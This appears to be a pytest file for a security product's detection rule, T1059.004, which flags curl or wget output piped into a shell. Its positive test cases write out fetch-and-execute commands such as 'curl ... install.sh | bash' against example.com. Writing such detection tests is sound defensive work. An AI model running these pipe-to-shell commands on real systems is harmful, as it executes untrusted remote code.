"""T1059.004 — install.sh or update.sh invoked via subprocess with piped input."""

from __future__ import annotations

import uuid
from pathlib import Path

from zaqorincore_server.rule_engine.sigma import parse_rule_file
from zaqorincore_server.self_defense import SELF_DEFENSE_RULES

from tests.rules.self_defense._helpers import find_rule, make_event


def _rule():
    rules = parse_rule_file(
        Path("rules/builtin/self_defense/T1059_004_curl_pipe_bash.yml")
    )
    assert len(rules) == 1
    return rules[0]


def test_rule_loads() -> None:
    rule = _rule()
    assert rule.title.startswith("T1059.004")
    assert rule.level == "medium"


def test_rule_id_is_uuid4() -> None:
    uuid.UUID(_rule().id, version=4)


def test_rule_status_experimental() -> None:
    rule = find_rule("T1059.004")
    assert rule in SELF_DEFENSE_RULES


def test_rule_tier_matches() -> None:
    assert _rule().level in ("low", "medium", "high", "critical")


def test_selection_grammar_valid() -> None:
    rule = _rule()
    assert rule.selection.get("event_type") == "process.exec"


def test_condition_valid() -> None:
    cond = _rule().condition
    assert cond.startswith("selection and (")
    assert "or" in cond


def test_whitelist_placeholder_in_fp() -> None:
    import yaml
    with open(
        "rules/builtin/self_defense/T1059_004_curl_pipe_bash.yml"
    ) as f:
        doc = yaml.safe_load(f)
    fps = doc.get("falsepositives") or []
    assert any("developer" in fp.lower() or "ci" in fp.lower() for fp in fps)


def test_threshold_not_required() -> None:
    import yaml
    with open(
        "rules/builtin/self_defense/T1059_004_curl_pipe_bash.yml"
    ) as f:
        doc = yaml.safe_load(f)
    assert doc["detection"].get("count", 1) == 1


def test_event_normalization_positive_curl_bash() -> None:
    rule = _rule()
    ev = make_event(
        event_type="process.exec",
        cmdline="curl -fsSL https://example.com/install.sh | bash",
    )
    assert rule.matches(ev)


def test_event_normalization_positive_wget_sh() -> None:
    rule = _rule()
    ev = make_event(
        event_type="process.exec",
        cmdline="wget -qO- https://example.com/install.sh | sh",
    )
    assert rule.matches(ev)


def test_event_normalization_negative_bare_curl() -> None:
    rule = _rule()
    ev = make_event(
        event_type="process.exec",
        cmdline="curl -O https://example.com/file.tar.gz",
    )
    assert not rule.matches(ev)


def test_event_missing_field_fails_closed() -> None:
    rule = _rule()
    ev = make_event(event_type="process.exec")
    # No cmdline -> filters cannot evaluate true.
    assert not rule.matches(ev)
